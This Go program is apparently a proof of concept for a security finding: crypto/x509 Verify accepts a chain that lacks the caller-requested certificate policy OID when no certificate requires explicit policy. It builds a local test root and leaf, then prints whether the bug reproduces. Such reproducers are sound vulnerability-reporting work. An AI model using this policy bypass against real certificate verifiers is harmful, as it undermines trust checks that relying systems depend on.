// PoC for finding 020: VerifyOptions.CertificatePolicies not enforced
// when explicit policy processing is not required.
//
// The unpatched check at src/crypto/x509/verify.go:1396 is:
//
//	if explicitPolicy == 0 && len(userConstrainedPolicySet) == 0 {
//	    return false
//	}
//
// When the caller sets opts.CertificatePolicies but neither the leaf nor
// any intermediate sets RequireExplicitPolicy, explicitPolicy stays > 0
// throughout chain processing. Even when the user-constrained policy set
// becomes empty (because no chain cert carries any of the caller-requested
// OIDs), the chain is still accepted.
//
// This PoC builds a self-signed root and an end-entity cert with policy
// OID 1.2.3.4. The caller asks Verify for policy OID 1.2.3.99 (not present
// anywhere in the chain). With the bug, Verify returns nil (success).
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"fmt"
	"math/big"
	"os"
	"time"
)

func mustOID(parts []uint64) x509.OID {
	o, err := x509.OIDFromInts(parts)
	if err != nil {
		panic(err)
	}
	return o
}

func main() {
	rootKey, _ := rsa.GenerateKey(rand.Reader, 2048)

	rootTpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "poc-020 root"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(24 * time.Hour),
		KeyUsage:              x509.KeyUsageCertSign,
		BasicConstraintsValid: true,
		IsCA:                  true,
		Policies:              []x509.OID{mustOID([]uint64{1, 2, 3, 4})},
	}
	rootDER, err := x509.CreateCertificate(rand.Reader, rootTpl, rootTpl, &rootKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	root, _ := x509.ParseCertificate(rootDER)

	leafKey, _ := rsa.GenerateKey(rand.Reader, 2048)
	leafTpl := &x509.Certificate{
		SerialNumber: big.NewInt(2),
		Subject:      pkix.Name{CommonName: "poc-020 leaf"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
		KeyUsage:     x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		Policies:     []x509.OID{mustOID([]uint64{1, 2, 3, 4})},
	}
	leafDER, err := x509.CreateCertificate(rand.Reader, leafTpl, root, &leafKey.PublicKey, rootKey)
	if err != nil {
		panic(err)
	}
	leaf, _ := x509.ParseCertificate(leafDER)

	roots := x509.NewCertPool()
	roots.AddCert(root)

	// Caller asks for a policy that is NOT in the chain.
	requested := mustOID([]uint64{1, 2, 3, 99})

	opts := x509.VerifyOptions{
		Roots:               roots,
		KeyUsages:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		CertificatePolicies: []x509.OID{requested},
		CurrentTime:         time.Now(),
	}

	chains, err := leaf.Verify(opts)
	fmt.Println("Caller-requested policy OID:", requested)
	fmt.Println("Chain leaf policy:           1.2.3.4 (not the requested OID)")
	fmt.Println("EXPECTED: Verify rejects chain (no requested policy in chain)")
	if err == nil {
		fmt.Println("GOT:      err == nil; got", len(chains), "chain(s)")
		fmt.Println("BUG REPRODUCED: caller-supplied CertificatePolicies not enforced.")
		return
	}
	fmt.Println("GOT:      err =", err, "(unexpected — bug did not reproduce)")
	os.Exit(2)
}
